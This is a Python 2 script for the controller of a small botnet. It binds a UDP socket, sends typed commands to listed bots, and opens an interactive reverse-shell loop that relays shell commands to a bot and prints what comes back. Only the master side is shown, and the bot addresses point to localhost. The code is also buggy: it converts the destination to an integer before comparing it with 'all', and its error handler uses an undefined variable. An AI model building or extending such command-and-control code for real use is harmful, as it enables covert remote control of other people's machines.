import sys
import socket

MASTER_IP = "127.0.0.1"
MASTER_PORT = 6000

#Read bots from file?
bots = [("127.0.0.1",6001),("127.0.0.1",6002)]
NUM_BOTS = 2


class Master:

	def __init__(self, bots, socket):
		#list of (ip,port) pairs
		self.bots = bots
		#list of connections
		self.sock = socket

	# 	self.conn = []

	# def add_conn(self,c):
	# 	self.conn.append(c)

	#Reverse Shell
	def reverse_shell(self,dest):

		print "Starting reverse shell...\n"

		while True:
			cmd = raw_input()				#Receive shell command
			if cmd == 'exit':					#Break if user wished to exit
				print "Exiting...\n"
				self.sock.sendto(cmd,dest)
				break

			self.sock.sendto(cmd,dest)

			data, addr = self.sock.recvfrom(1024)
			print data




if __name__ == '__main__':
 
	try:
		# s.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))		#Create socket
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)	#Create socket
		s.bind((MASTER_IP,MASTER_PORT))								#Bind to port
		print 'Socket created'
	except socket.error, msg :
		print 'Failed: ' + str(i) + '. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
		sys.exit()
			
	mast = Master(bots,s)
	
	while True:

		print "Enter command..."
		cmd = raw_input()
		cmd = cmd.split(' ')

		dest = int(cmd[0])
		msg = cmd[1]
		if dest == "all":
			print "sending command to all bots..."
			for i in xrange(NUM_BOTS):
				mast.sock.sendto(msg,mast.bots[i])
		else:
			print "sending " + msg + " to " + str(dest)
			mast.sock.sendto(msg,mast.bots[dest])
			data, addr = mast.sock.recvfrom(1024)

			if data == "RVSH":
				mast.reverse_shell(mast.bots[dest])



	mast.sock.close()
